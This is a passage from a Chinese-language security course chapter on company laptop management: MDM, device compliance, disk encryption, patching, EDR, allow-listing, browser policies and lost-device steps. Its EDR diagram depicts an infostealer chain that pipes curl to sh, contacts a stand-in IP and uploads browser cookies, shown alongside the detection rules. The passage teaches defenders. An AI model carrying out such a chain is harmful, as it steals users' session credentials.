DEEP({ 'mis-devices': `
<p>上一課說，對大多數公司來說，筆電才是真正的邊界。這一章把這句話拆開：一台筆電上到底放著哪些鑰匙；MDM 怎麼從遠端指揮一台不在你眼前的電腦，哪些事它做不到；裝置怎麼向身分提供者證明自己「健康」；全碟加密的金鑰藏在哪裡、忘記密碼時靠什麼救；更新怎麼分批推又不拖；EDR 實際上記錄了什麼、怎麼從一堆正常行為裡挑出惡意程式；白名單、瀏覽器管理、私人裝置、遺失處理；最後是開發者自己的筆電，以及怎麼在全公司導入防釣魚的登入方式。</p>

<h3><span class="badge lv1">基礎</span>一、筆電是一整串鑰匙</h3>
<p>想像一個管理員的鑰匙圈：大門、機房、財務室、倉庫的鑰匙全串在一起。撿到這串鑰匙的人，不需要撬任何一扇門。開發者的筆電就是這樣一串鑰匙，而且大部分鑰匙是「已經插在門上、轉開了」的狀態：</p>
<figure class="figure"><svg viewBox="0 0 660 290" class="fg" style="width:100%;max-width:660px" role="img" aria-label="一台開發者筆電上的六樣東西，各自直接打開一扇門：瀏覽器 cookie、密碼管理器、SSH 金鑰、雲端憑證、kubeconfig、環境變數檔">
<text x="165" y="26" text-anchor="middle" class="fg-t lg">一台開發者筆電</text>
<text x="530" y="26" text-anchor="middle" class="fg-t lg">它打得開的門</text>
<rect x="20" y="40" width="290" height="236" rx="10" class="fg-b"/>
<rect x="36" y="56" width="258" height="30" rx="5" class="fg-b alt"/><text x="48" y="76" class="fg-t sm">瀏覽器裡的 cookie</text>
<rect x="36" y="92" width="258" height="30" rx="5" class="fg-b alt"/><text x="48" y="112" class="fg-t sm">密碼管理器（已解鎖）</text>
<rect x="36" y="128" width="258" height="30" rx="5" class="fg-b alt"/><text x="48" y="148" class="fg-t sm mono">~/.ssh/id_ed25519</text>
<rect x="36" y="164" width="258" height="30" rx="5" class="fg-b warm"/><text x="48" y="184" class="fg-t sm mono">~/.aws/credentials</text>
<rect x="36" y="200" width="258" height="30" rx="5" class="fg-b alt"/><text x="48" y="220" class="fg-t sm mono">~/.kube/config</text>
<rect x="36" y="236" width="258" height="30" rx="5" class="fg-b warm"/><text x="48" y="256" class="fg-t sm">.env 檔、shell 歷史</text>
<line x1="294" y1="71" x2="412" y2="71" class="fg-l"/><polygon points="420,71 412,66.5 412,75.5" class="fg-a"/>
<line x1="294" y1="107" x2="412" y2="107" class="fg-l"/><polygon points="420,107 412,102.5 412,111.5" class="fg-a"/>
<line x1="294" y1="143" x2="412" y2="143" class="fg-l"/><polygon points="420,143 412,138.5 412,147.5" class="fg-a"/>
<line x1="294" y1="179" x2="412" y2="179" class="fg-l warm"/><polygon points="420,179 412,174.5 412,183.5" class="fg-a warm"/>
<line x1="294" y1="215" x2="412" y2="215" class="fg-l"/><polygon points="420,215 412,210.5 412,219.5" class="fg-a"/>
<line x1="294" y1="251" x2="412" y2="251" class="fg-l warm"/><polygon points="420,251 412,246.5 412,255.5" class="fg-a warm"/>
<rect x="420" y="56" width="220" height="30" rx="5" class="fg-b"/><text x="432" y="76" class="fg-t sm">信箱、聊天、各種 SaaS</text>
<rect x="420" y="92" width="220" height="30" rx="5" class="fg-b"/><text x="432" y="112" class="fg-t sm">所有存起來的帳號</text>
<rect x="420" y="128" width="220" height="30" rx="5" class="fg-b"/><text x="432" y="148" class="fg-t sm">伺服器、Git 遠端</text>
<rect x="420" y="164" width="220" height="30" rx="5" class="fg-b"/><text x="432" y="184" class="fg-t sm">雲端帳號（包含帳單）</text>
<rect x="420" y="200" width="220" height="30" rx="5" class="fg-b"/><text x="432" y="220" class="fg-t sm">Kubernetes 叢集</text>
<rect x="420" y="236" width="220" height="30" rx="5" class="fg-b"/><text x="432" y="256" class="fg-t sm">資料庫、第三方 API</text>
</svg><figcaption>每一樣都是一把已經能用的鑰匙，不需要再輸入密碼或做第二道驗證。橘色那兩樣通常是純文字檔，連加密都沒有，任何以你的身分執行的程式都讀得到。</figcaption></figure>
<p>攻擊者拿到這串鑰匙有三種情境，各自要靠不同的防線：</p>
<table>
<tr><th>情境</th><th>靠什麼擋</th><th>擋不住的</th></tr>
<tr><td>筆電在關機狀態被偷</td><td>全碟加密（第四節）</td><td>幾乎都擋得住</td></tr>
<tr><td>筆電開著、螢幕鎖住被偷</td><td>螢幕鎖、作業系統本身的保護、遠端鎖定與清除</td><td>沒更新的系統可能有繞過螢幕鎖的漏洞</td></tr>
<tr><td>惡意程式在你登入的狀態下執行</td><td>EDR、白名單、不用管理員權限、短效憑證</td><td>加密完全沒用：磁碟對你自己的程式是打開的</td></tr>
</table>
<p>第三種最常見，也最常被誤以為「有加密就安全」。這一章大部分的篇幅都在處理它。</p>

<h3><span class="badge lv1">基礎</span>二、MDM：公司手上的遙控器</h3>
<p><b>行動裝置管理</b>（mobile device management，MDM）名字裡有「行動」，但現在管的是筆電、桌機、手機、平板全部。一台裝置要先<b>註冊</b>（enroll）進 MDM，之後 MDM 才能對它下指令。註冊有三種方式，差別很大：</p>
<ul>
<li><b>零接觸部署</b>：公司向原廠或經銷商買的機器，序號會自動出現在 Apple Business Manager 或 Windows Autopilot 裡。新人拆箱、開機、連上網路，機器自己找到公司的 MDM 並套用設定。使用者沒辦法拔掉這個管理，因為它寫在出廠紀錄裡。</li>
<li><b>使用者自己安裝描述檔</b>：給已經在用的機器補註冊。可以運作，但有管理員權限的使用者通常也能自己移除。</li>
<li><b>私人裝置的使用者註冊</b>（user enrollment）：只管工作的那一塊，第八節再談。</li>
</ul>
<h4>一道指令怎麼送到一台不在辦公室的筆電</h4>
<figure class="figure"><svg viewBox="0 0 680 300" class="fg" style="width:100%;max-width:680px" role="img" aria-label="MDM 下指令的流程：管理員按下鎖定，MDM 伺服器請 Apple 推播服務叫醒筆電，筆電自己用 HTTPS 連回 MDM 拿指令、執行、回報">
<rect x="15" y="12" width="130" height="36" rx="6" class="fg-b"/><text x="80" y="35" text-anchor="middle" class="fg-t">MIS 管理員</text>
<rect x="185" y="12" width="130" height="36" rx="6" class="fg-b hot"/><text x="250" y="35" text-anchor="middle" class="fg-t">MDM 伺服器</text>
<rect x="355" y="12" width="130" height="36" rx="6" class="fg-b"/><text x="420" y="35" text-anchor="middle" class="fg-t">Apple 推播 APNs</text>
<rect x="525" y="12" width="130" height="36" rx="6" class="fg-b alt"/><text x="590" y="35" text-anchor="middle" class="fg-t">員工的筆電</text>
<line x1="80" y1="48" x2="80" y2="290" class="fg-l dim dash"/>
<line x1="250" y1="48" x2="250" y2="290" class="fg-l dim dash"/>
<line x1="420" y1="48" x2="420" y2="290" class="fg-l dim dash"/>
<line x1="590" y1="48" x2="590" y2="290" class="fg-l dim dash"/>
<line x1="80" y1="80" x2="242" y2="80" class="fg-l"/><polygon points="250,80 242,75.5 242,84.5" class="fg-a"/>
<text x="165" y="72" text-anchor="middle" class="fg-t sm">① 按下「鎖定」</text>
<line x1="250" y1="118" x2="412" y2="118" class="fg-l"/><polygon points="420,118 412,113.5 412,122.5" class="fg-a"/>
<text x="335" y="110" text-anchor="middle" class="fg-t sm">② 請叫醒這一台</text>
<line x1="420" y1="156" x2="582" y2="156" class="fg-l"/><polygon points="590,156 582,151.5 582,160.5" class="fg-a"/>
<text x="505" y="148" text-anchor="middle" class="fg-t sm">③ 只說「有事」</text>
<line x1="590" y1="194" x2="258" y2="194" class="fg-l alt"/><polygon points="250,194 258,189.5 258,198.5" class="fg-a alt"/>
<text x="505" y="186" text-anchor="middle" class="fg-t sm alt">④ HTTPS 連回來</text>
<line x1="250" y1="232" x2="582" y2="232" class="fg-l on"/><polygon points="590,232 582,227.5 582,236.5" class="fg-a on"/>
<text x="505" y="224" text-anchor="middle" class="fg-t sm acc">⑤ 指令：DeviceLock</text>
<line x1="590" y1="270" x2="258" y2="270" class="fg-l alt"/><polygon points="250,270 258,265.5 258,274.5" class="fg-a alt"/>
<text x="505" y="262" text-anchor="middle" class="fg-t sm alt">⑥ 回報：已完成</text>
<text x="165" y="236" text-anchor="middle" class="fg-t sm warm">沒開機、沒網路：</text>
<text x="165" y="254" text-anchor="middle" class="fg-t sm warm">指令就一直排隊</text>
</svg><figcaption>推播服務只負責「叫醒」，不帶指令內容。真正的指令是筆電自己連回 MDM 拿的。所以 MDM 能做的一切，前提都是那台機器開著、而且連得上網。</figcaption></figure>
<p>Windows 的 Intune 也是同樣的思路：裝置定期、或被通知後主動連回來拿工作。Apple 較新的<b>宣告式裝置管理</b>（declarative device management，DDM）更進一步：MDM 把「目標狀態」交給裝置，例如「macOS 要在某天之前更新到某版」，裝置自己執行、狀態一變就主動回報，不必伺服器一直來回輪詢。</p>
<h4>MDM 能做的、做不到的</h4>
<table>
<tr><th>做得到</th><th>做不到</th></tr>
<tr><td>推設定：密碼長度、螢幕鎖時間、防火牆、Wi-Fi 與 VPN 設定</td><td>對一台關機或離線的機器做任何事</td></tr>
<tr><td>強制開啟全碟加密，並把復原金鑰收回來保管</td><td>偵測惡意程式：那是 EDR 的工作</td></tr>
<tr><td>安裝、移除公司的應用程式</td><td>擋住一個擁有管理員權限、而且鐵了心的使用者</td></tr>
<tr><td>回報清冊：型號、序號、系統版本、裝了哪些 App</td><td>在公司的 Apple 或 Windows 管理下，看你的私人訊息、瀏覽紀錄或螢幕（系統設計上就不給）</td></tr>
<tr><td>遠端鎖定、遠端清除</td><td>保證清除指令一定送達（看上面那張圖）</td></tr>
</table>
<p>最後一列很重要：遠端清除是「盡力而為」。所以上一課的遺失流程裡，清除只是第一步，輪替憑證才是保險。</p>

<h3><span class="badge lv2">進階</span>三、合規與條件式存取：裝置也要出示健康證明</h3>
<p>上一章的條件式存取，問的是「這個人是誰」。加上裝置之後，還要問「他用的這台機器狀況好不好」。這需要三方合作：MDM 檢查裝置、把結果交給身分提供者、身分提供者在登入時拿來做決定。</p>
<figure class="figure"><svg viewBox="0 0 680 280" class="fg" style="width:100%;max-width:680px" role="img" aria-label="Amy 的筆電把狀態回報給 MDM，MDM 判定 macOS 版本太舊而不合規，身分提供者因此擋下雲端主控台的登入，提示更新，更新後重新回報、合規，就放行">
<rect x="20" y="30" width="180" height="200" rx="8" class="fg-b"/>
<text x="110" y="54" text-anchor="middle" class="fg-t lg">Amy 的筆電</text>
<text x="34" y="84" class="fg-t sm">✓ FileVault 已開</text>
<text x="34" y="108" class="fg-t sm">✓ 防火牆已開</text>
<text x="34" y="132" class="fg-t sm">✓ EDR 在執行</text>
<text x="34" y="156" class="fg-t sm">✓ 螢幕鎖 5 分鐘</text>
<text x="34" y="180" class="fg-t sm warm">✗ macOS 落後兩版</text>
<line x1="200" y1="130" x2="232" y2="130" class="fg-l"/><polygon points="240,130 232,125.5 232,134.5" class="fg-a"/>
<text x="220" y="120" text-anchor="middle" class="fg-t sm">回報</text>
<rect x="240" y="100" width="110" height="60" rx="6" class="fg-b alt"/>
<text x="295" y="125" text-anchor="middle" class="fg-t">MDM</text>
<text x="295" y="145" text-anchor="middle" class="fg-t sm">逐項比對</text>
<line x1="350" y1="130" x2="392" y2="130" class="fg-l warm"/><polygon points="400,130 392,125.5 392,134.5" class="fg-a warm"/>
<text x="375" y="120" text-anchor="middle" class="fg-t sm warm">不合規</text>
<rect x="400" y="100" width="120" height="60" rx="6" class="fg-b hot"/>
<text x="460" y="125" text-anchor="middle" class="fg-t">身分提供者</text>
<text x="460" y="145" text-anchor="middle" class="fg-t sm">條件式存取</text>
<line x1="520" y1="130" x2="562" y2="130" class="fg-l warm dash"/><polygon points="570,130 562,125.5 562,134.5" class="fg-a warm"/>
<text x="545" y="120" text-anchor="middle" class="fg-t sm warm">擋下</text>
<rect x="570" y="100" width="90" height="60" rx="6" class="fg-b"/>
<text x="615" y="125" text-anchor="middle" class="fg-t">雲端</text>
<text x="615" y="145" text-anchor="middle" class="fg-t">主控台</text>
<path d="M460 160 V248 H110 V238" class="fg-l alt"/><polygon points="110,230 105.5,238 114.5,238" class="fg-a alt"/>
<text x="285" y="268" text-anchor="middle" class="fg-t sm alt">提示更新 → 更新後重新回報 → 合規，放行</text>
</svg><figcaption>身分提供者自己看不到筆電裡面，它相信的是 MDM 的判定。所以 MDM 的檢查項目，就是「公司裝置」這幾個字的實際定義。</figcaption></figure>
<p>走一遍 Amy 的週一早上：</p>
<ol>
<li>公司的合規政策規定：macOS 必須是最新的兩個大版本之一，且安全性更新落後不超過 14 天；不合規時有 3 天寬限期。</li>
<li>Amy 一直按「明天再提醒我」。MDM 在例行檢查時發現她落後了，標成「寬限中」，並在她螢幕上跳通知。</li>
<li>寬限期過了，狀態變成「不合規」，並同步給身分提供者。</li>
<li>她要登入雲端主控台，條件式存取的規則是「這個應用程式要求合規裝置」，於是被擋下，畫面告訴她原因和解法。信箱、聊天這些沒要求合規的應用程式照常可用，她還能找 IT 求救。</li>
<li>她更新、重新開機，筆電重新回報，幾分鐘到幾十分鐘後恢復合規，登入放行。</li>
</ol>
<p>還有一個技術問題：身分提供者怎麼確定「現在來登入的」就是那台被 MDM 判定合規的筆電，而不是攻擊者偽造的？答案是裝置在註冊時會產生一把<b>存在安全晶片裡、拿不出來的私鑰</b>（Windows 的 TPM、Mac 的 Secure Enclave），登入時用它簽章證明身分。所以合規狀態跟著那塊晶片走，複製不走。Okta 的 FastPass、Google 的端點驗證、Entra 加入裝置的單一登入，都是這個原理的不同實作。</p>

<h3><span class="badge lv2">進階</span>四、全碟加密與金鑰託管</h3>
<p>FileVault（macOS）和 BitLocker（Windows）做的事一樣：整顆磁碟用 AES 加密，資料寫進去之前加密、讀出來之後解密，對你完全透明。重點不在演算法，而在<b>金鑰放在哪裡、被什麼保護</b>。</p>
<figure class="figure"><svg viewBox="0 0 660 300" class="fg" style="width:100%;max-width:660px" role="img" aria-label="全碟加密的金鑰層級：登入密碼加安全晶片，或復原金鑰，都能解開金鑰加密金鑰，再解開磁碟加密金鑰，磁碟金鑰才真正加密資料；復原金鑰有一份副本託管在 MDM">
<rect x="40" y="20" width="140" height="44" rx="6" class="fg-b alt"/><text x="110" y="47" text-anchor="middle" class="fg-t">登入密碼</text>
<rect x="200" y="20" width="160" height="44" rx="6" class="fg-b alt"/><text x="280" y="38" text-anchor="middle" class="fg-t">安全晶片</text><text x="280" y="56" text-anchor="middle" class="fg-t sm">TPM／Secure Enclave</text>
<rect x="420" y="20" width="200" height="44" rx="6" class="fg-b warm"/><text x="520" y="38" text-anchor="middle" class="fg-t">復原金鑰</text><text x="520" y="56" text-anchor="middle" class="fg-t sm">BitLocker 是 48 位數字</text>
<path d="M110 64 V92 H250 V100" class="fg-l"/><polygon points="250,108 245.5,100 254.5,100" class="fg-a"/>
<text x="180" y="83" text-anchor="middle" class="fg-t sm">平常開機</text>
<line x1="280" y1="64" x2="280" y2="100" class="fg-l"/><polygon points="280,108 275.5,100 284.5,100" class="fg-a"/>
<path d="M480 64 V92 H310 V100" class="fg-l warm"/><polygon points="310,108 305.5,100 314.5,100" class="fg-a warm"/>
<text x="395" y="83" text-anchor="middle" class="fg-t sm warm">忘記密碼時用</text>
<line x1="590" y1="64" x2="590" y2="100" class="fg-l alt dash"/><polygon points="590,108 585.5,100 594.5,100" class="fg-a alt"/>
<text x="598" y="88" class="fg-t sm alt">上傳</text>
<rect x="510" y="108" width="140" height="44" rx="6" class="fg-b alt"/><text x="580" y="127" text-anchor="middle" class="fg-t">託管副本</text><text x="580" y="144" text-anchor="middle" class="fg-t sm">MDM／Entra ID</text>
<rect x="200" y="108" width="160" height="44" rx="6" class="fg-b hot"/><text x="280" y="127" text-anchor="middle" class="fg-t">金鑰加密金鑰</text><text x="280" y="144" text-anchor="middle" class="fg-t sm">KEK</text>
<text x="188" y="134" text-anchor="end" class="fg-t sm">換密碼：只重包這層</text>
<line x1="280" y1="152" x2="280" y2="180" class="fg-l"/><polygon points="280,188 275.5,180 284.5,180" class="fg-a"/>
<rect x="200" y="188" width="160" height="44" rx="6" class="fg-b hot"/><text x="280" y="207" text-anchor="middle" class="fg-t">磁碟加密金鑰</text><text x="280" y="224" text-anchor="middle" class="fg-t sm">VEK</text>
<text x="188" y="214" text-anchor="end" class="fg-t sm">遠端清除：丟掉它就好</text>
<line x1="280" y1="232" x2="280" y2="248" class="fg-l"/><polygon points="280,256 275.5,248 284.5,248" class="fg-a"/>
<rect x="120" y="256" width="320" height="34" rx="6" class="fg-b"/><text x="280" y="278" text-anchor="middle" class="fg-t">整顆磁碟的資料（AES-XTS）</text>
</svg><figcaption>真正加密資料的磁碟金鑰從不改變，它被上面一層金鑰包起來；密碼和復原金鑰只是兩把能打開那一層的鑰匙。所以換密碼是瞬間的事，清除也是：把磁碟金鑰銷毀，資料就只剩亂碼。</figcaption></figure>
<p>這個分層帶來三個實務結論：</p>
<ul>
<li><b>換密碼不用重新加密整顆磁碟</b>，只是用新密碼重新包一次上面那層。</li>
<li><b>遠端清除可以在幾秒內完成</b>：Apple 晶片的 Mac、新的 iPhone，「清除所有內容和設定」其實就是銷毀金鑰。</li>
<li><b>復原金鑰一定要託管</b>。員工忘記密碼、主機板換過、BitLocker 因為韌體更新要求輸入復原金鑰，這些每週都會發生。MDM 在開啟加密時就把復原金鑰收回去保管（叫<b>金鑰託管</b>，key escrow），服務台確認身分後才能查看；用過一次的復原金鑰要輪替，因為它已經被人看過了。沒有託管，忘記密碼就等於資料全毀。</li>
</ul>
<h4>加密擋不住什麼</h4>
<p>開機、登入之後，磁碟對作業系統是解開的。這時保護你的是螢幕鎖和系統本身，不是加密。所以出差過海關、把筆電交給別人之前，<b>關機</b>比闔上螢幕安全得多。Windows 上若只用 TPM 自動解鎖（開機不用輸入任何東西），偷走整台筆電的人至少能開機到登入畫面；也有研究示範過在獨立 TPM 晶片的線路上直接監聽金鑰。對高風險的機器，可以改成「TPM 加開機 PIN」。</p>

<h3><span class="badge lv3">專業</span>五、補丁管理：分批推，但要有最後期限</h3>
<p>上一課說，針對筆電的攻擊大多是用早就修掉的漏洞。問題從來不是「有沒有更新可裝」，而是「全公司裝完要多久」。好的補丁管理有兩個看似衝突的目標：<b>不要一次弄壞所有人</b>，以及<b>不要讓任何人拖太久</b>。解法是分組（ring）加期限（deadline）：</p>
<figure class="figure"><svg viewBox="0 24 660 232" class="fg" style="width:100%;max-width:660px" role="img" aria-label="補丁分組時間軸：測試組第 0 天開始、第 3 天強制；先行組第 3 天開始、第 10 天強制；全公司第 7 天開始、第 14 天強制；正在被利用的漏洞則所有人 48 小時內">
<text x="20" y="59" class="fg-t sm">測試組（5%）</text>
<text x="20" y="104" class="fg-t sm">先行組（20%）</text>
<text x="20" y="149" class="fg-t sm">全公司</text>
<text x="20" y="194" class="fg-t sm warm">被利用中的漏洞</text>
<rect x="150" y="40" width="48" height="28" rx="4" class="fg-b hot"/>
<line x1="198" y1="36" x2="198" y2="72" class="fg-l warm"/>
<text x="206" y="59" class="fg-t sm">第 3 天強制</text>
<rect x="198" y="85" width="112" height="28" rx="4" class="fg-b hot"/>
<line x1="310" y1="81" x2="310" y2="117" class="fg-l warm"/>
<text x="318" y="104" class="fg-t sm">第 10 天強制</text>
<rect x="262" y="130" width="112" height="28" rx="4" class="fg-b hot"/>
<line x1="374" y1="126" x2="374" y2="162" class="fg-l warm"/>
<text x="382" y="149" class="fg-t sm">第 14 天強制</text>
<rect x="150" y="175" width="32" height="28" rx="4" class="fg-b warm"/>
<text x="190" y="194" class="fg-t sm warm">48 小時內，不分組</text>
<line x1="150" y1="225" x2="630" y2="225" class="fg-l dim"/>
<line x1="150" y1="221" x2="150" y2="229" class="fg-l"/><text x="150" y="244" text-anchor="middle" class="fg-t sm">0</text>
<line x1="198" y1="221" x2="198" y2="229" class="fg-l"/><text x="198" y="244" text-anchor="middle" class="fg-t sm">3</text>
<line x1="262" y1="221" x2="262" y2="229" class="fg-l"/><text x="262" y="244" text-anchor="middle" class="fg-t sm">7</text>
<line x1="310" y1="221" x2="310" y2="229" class="fg-l"/><text x="310" y="244" text-anchor="middle" class="fg-t sm">10</text>
<line x1="374" y1="221" x2="374" y2="229" class="fg-l"/><text x="374" y="244" text-anchor="middle" class="fg-t sm">14</text>
<line x1="486" y1="221" x2="486" y2="229" class="fg-l"/><text x="486" y="244" text-anchor="middle" class="fg-t sm">21</text>
<line x1="630" y1="221" x2="630" y2="229" class="fg-l"/><text x="630" y="244" text-anchor="middle" class="fg-t sm">30 天</text>
</svg><figcaption>綠色是「可以自己挑時間裝」的期間，橘色直線是期限，過了就強制安裝並重新開機。測試組沒出事，下一組才開始；但正在被利用的漏洞不排隊。</figcaption></figure>
<ul>
<li><b>測試組</b>是 MIS 自己和幾位自願的工程師。有問題（VPN 連不上、某個開發工具壞掉），在這裡就被發現。</li>
<li><b>期限</b>之前，使用者可以自己挑時間；期限一到，系統強制安裝並重開。沒有期限的「建議更新」，三個月後會有三成的人還沒裝。macOS 的宣告式管理、Windows Update for Business 的部署組，都支援這種「可延後、但有上限」的設定。</li>
<li><b>正在被利用的漏洞</b>（例如被列進美國 CISA 的已知遭利用漏洞清單，KEV）不走正常排程，直接全公司限期。</li>
<li><b>不只是作業系統</b>：瀏覽器會自己下載更新，但要重新啟動才生效，有人的 Chrome 開了一個月；Zoom、Slack、VPN 用戶端、PDF 閱讀器都要納入。用 MDM 的清冊報表盯「幾天內有幾成機器到達最新版」，這是 MIS 最該放在儀表板上的數字。</li>
</ul>
<p>舊機器是另一個問題。Apple 和 Microsoft 都會停止替舊版系統出安全性更新；跑不動新系統的機器，再怎麼管都追不上，該汰換就要編預算。</p>

<h3><span class="badge lv3">專業</span>六、EDR：裝置上的行車紀錄器</h3>
<p>傳統防毒軟體像門口的通緝照片：檔案長得跟已知的惡意程式一樣就擋。<b>EDR</b>（endpoint detection and response，端點偵測與回應）像行車紀錄器加保全中心：它把裝置上發生的事一直錄下來送回雲端，用規則和模型找出可疑的<b>行為</b>，再讓人（或自動化）遠端處理。常見產品有 Microsoft Defender for Endpoint、CrowdStrike Falcon、SentinelOne。</p>
<h4>它記錄什麼</h4>
<table>
<tr><th>事件</th><th>例子</th></tr>
<tr><td>行程建立</td><td>誰啟動了誰、完整的命令列、執行檔的雜湊和簽章者</td></tr>
<tr><td>檔案</td><td>新建、修改、刪除；特別是在啟動項目、系統資料夾裡的</td></tr>
<tr><td>網路連線</td><td>哪個行程連到哪個 IP、哪個網域</td></tr>
<tr><td>持久化</td><td>新增的 LaunchAgent、排程工作、Windows 機碼裡的開機啟動</td></tr>
<tr><td>登入與權限</td><td>誰登入、誰用了 sudo 或管理員權限</td></tr>
</table>
<p>它拿這些資料的方式，是作業系統提供的接口：macOS 的 Endpoint Security 框架、Windows 的核心回呼與 ETW、Linux 的 eBPF。這也代表 EDR 跑在系統很深的地方。2024 年 7 月 CrowdStrike 一次有問題的內容更新，讓全球大約 850 萬台 Windows 機器開機就當機，就是這個位置的代價：它能看到一切，也能弄倒一切。</p>
<h4>它怎麼抓壞人：看家族樹</h4>
<figure class="figure"><svg viewBox="0 0 680 320" class="fg" style="width:100%;max-width:680px" role="img" aria-label="EDR 看到的行程家族樹：來路不明的修圖工具啟動 shell，shell 執行 curl 下載腳本，再用 python 讀取瀏覽器 cookie、上傳到外部位址；右邊三條偵測規則各自命中一個節點，合起來判定隔離這台機器">
<text x="565" y="40" text-anchor="middle" class="fg-t sm acc">EDR 偵測規則</text>
<rect x="30" y="24" width="300" height="34" rx="5" class="fg-b"/><text x="42" y="46" class="fg-t sm">PhotoTool.app（剛下載、沒簽章）</text>
<path d="M42 58 V91 H54" class="fg-l"/>
<rect x="54" y="74" width="300" height="34" rx="5" class="fg-b"/><text x="66" y="96" class="fg-t sm mono">zsh -c "curl … | sh"</text>
<path d="M66 108 V141 H78" class="fg-l"/>
<rect x="78" y="124" width="300" height="34" rx="5" class="fg-b"/><text x="90" y="146" class="fg-t sm mono">curl https://203.0.113.50/p</text>
<path d="M90 158 V191 H102" class="fg-l"/>
<rect x="102" y="174" width="300" height="34" rx="5" class="fg-b warm"/><text x="114" y="196" class="fg-t sm">python3 讀取 Chrome 的 Cookies</text>
<path d="M114 208 V241 H126" class="fg-l"/>
<rect x="126" y="224" width="300" height="34" rx="5" class="fg-b warm"/><text x="138" y="246" class="fg-t sm">連到 203.0.113.50，上傳 4 MB</text>
<rect x="470" y="74" width="190" height="34" rx="5" class="fg-b"/><text x="565" y="96" text-anchor="middle" class="fg-t sm">沒簽章的程式開 shell</text>
<rect x="470" y="174" width="190" height="34" rx="5" class="fg-b"/><text x="565" y="196" text-anchor="middle" class="fg-t sm">非瀏覽器讀 cookie 檔</text>
<rect x="470" y="224" width="190" height="34" rx="5" class="fg-b"/><text x="565" y="246" text-anchor="middle" class="fg-t sm">陌生位址大量上傳</text>
<line x1="354" y1="91" x2="462" y2="91" class="fg-l warm dash"/><polygon points="470,91 462,86.5 462,95.5" class="fg-a warm"/>
<line x1="402" y1="191" x2="462" y2="191" class="fg-l warm dash"/><polygon points="470,191 462,186.5 462,195.5" class="fg-a warm"/>
<line x1="426" y1="241" x2="462" y2="241" class="fg-l warm dash"/><polygon points="470,241 462,236.5 462,245.5" class="fg-a warm"/>
<line x1="565" y1="258" x2="565" y2="268" class="fg-l warm"/><polygon points="565,276 560.5,268 569.5,268" class="fg-a warm"/>
<rect x="470" y="276" width="190" height="34" rx="5" class="fg-b warm"/><text x="565" y="298" text-anchor="middle" class="fg-t sm warm">判定：隔離這台機器</text>
<text x="30" y="298" class="fg-t sm">單看任何一步都可能正常，連起來就不是</text>
</svg><figcaption>curl、python3、讀檔、連網，每一個動作開發者每天都在做。EDR 抓的是整條家族樹：誰生了誰、在什麼順序下做了什麼。這正是上一章「資訊竊取程式」實際在機器上留下的樣子。</figcaption></figure>
<p>偵測大致分四類：已知惡意檔案的雜湊與特徵；行為規則（「Word 開了 PowerShell」「非瀏覽器程式讀瀏覽器的 cookie 資料庫」）；機器學習模型給的分數；以及威脅情報裡的已知惡意 IP、網域。命中之後的回應：結束行程、隔離檔案，或把整台機器<b>網路隔離</b>，只留它跟 EDR 雲端的連線，讓資安人員遠端調查，而使用者的機器不會再把資料往外送。</p>
<p>開發者的機器是 EDR 最頭痛的地方：編譯器每分鐘產生新的執行檔、測試框架一次開幾百個行程、腳本到處 curl。誤報一多，大家就會要求「把整個 ~/Projects 排除」。這種排除正是攻擊者最喜歡的藏身處。比較好的做法是針對特定工具、特定行為調整規則，而不是排除整個資料夾。</p>

<h3><span class="badge lv3">專業</span>七、應用程式白名單與瀏覽器管理</h3>
<h4>白名單：預設不准執行</h4>
<p>EDR 是「先讓它跑，看到壞事再擋」。<b>應用程式白名單</b>（application allow-listing）反過來：只有被允許的程式才能執行。Windows 用 App Control for Business（以前叫 WDAC）或 AppLocker，macOS 可以用開源的 Santa。規則通常不是一個一個檔案寫，而是寫「誰簽的章」：Apple 的開發者 Team ID、Windows 的發行者憑證。這樣廠商出新版，不用改規則。</p>
<p>導入一律分兩步：先開<b>監看模式</b>，只記錄「如果啟用了，哪些程式會被擋」，跑幾週收集名單；再對一小群人開<b>封鎖模式</b>。它對會計、客服這種軟體很固定的職務效果極好；對開發者，則要另外允許自己編譯出來的東西（用路徑或開發者憑證），或接受只在監看模式下運作。</p>
<h4>瀏覽器：現代人一半的工作都在裡面</h4>
<p>瀏覽器擴充套件的權限常常是「讀取和變更你在所有網站上的資料」，等於坐在你和每一個 SaaS 中間。擴充套件也會被轉賣，或開發者帳號被盜後推送惡意更新：2024 年底就有一批擴充套件的開發者被釣魚，攻擊者推了一版偷 cookie 的更新，自動裝到所有使用者的瀏覽器裡。所以公司要管瀏覽器，而且 Chrome、Edge 都能透過 MDM 下企業政策：</p>
<ul>
<li><code>ExtensionInstallBlocklist</code> 設成 <code>*</code>（全部禁止），再用 <code>ExtensionInstallAllowlist</code> 列出核准的擴充套件。</li>
<li><code>ExtensionInstallForcelist</code> 強制安裝公司的密碼管理器。</li>
<li>關閉瀏覽器內建的存密碼功能，讓密碼只放在密碼管理器裡，減少資訊竊取程式能撈到的東西。</li>
<li>強制登入公司的瀏覽器設定檔，讓工作和私人的瀏覽資料分開。</li>
</ul>

<h3><span class="badge lv3">專業</span>八、私人裝置與遺失處理</h3>
<h4>BYOD 的四種做法</h4>
<p>員工用自己的手機收公司信，叫 <b>BYOD</b>（bring your own device）。公司要的是控制力，員工要的是隱私，四種做法在兩者之間取捨：</p>
<table>
<tr><th>做法</th><th>公司能做什麼</th><th>員工的隱私</th></tr>
<tr><td>整台納管（公司配發的才適合）</td><td>全部：設定、清冊、整台清除</td><td>最少</td></tr>
<tr><td>只管工作區（Apple 的使用者註冊、Android 工作設定檔）</td><td>工作 App 和資料放在隔開的空間；只清除那一塊</td><td>公司看不到私人 App 和資料</td></tr>
<tr><td>只管 App（Intune 的應用程式保護政策）</td><td>工作 App 要 PIN、不准複製貼上到私人 App、遠端清除工作資料</td><td>裝置完全不註冊</td></tr>
<tr><td>只開網頁、不落地</td><td>只能用瀏覽器或遠端桌面，本機不存任何東西</td><td>最多</td></tr>
</table>
<p>不管選哪種，都要搭配條件式存取：沒有走以上任何一種方式的裝置，只能用網頁版，或乾脆不准。不然「用私人筆電裝桌面版同步整個雲端硬碟」就繞過了所有設計。</p>
<h4>裝置遺失：先處理憑證，再處理機器</h4>
<table>
<tr><th>時間</th><th>動作</th></tr>
<tr><td>接到通報 15 分鐘內</td><td>在 MDM 遠端鎖定並顯示聯絡訊息；在身分提供者撤銷持有人所有工作階段；將這台裝置標成不信任</td></tr>
<tr><td>1 小時內</td><td>判斷遺失時的狀態（關機？鎖螢幕？）；照清冊列出這台上的憑證：SSH 金鑰、雲端金鑰、程式碼代管 token、VPN 憑證，全部撤銷或輪替</td></tr>
<tr><td>確定找不回</td><td>遠端清除；保留 Activation Lock 讓機器無法轉賣再用</td></tr>
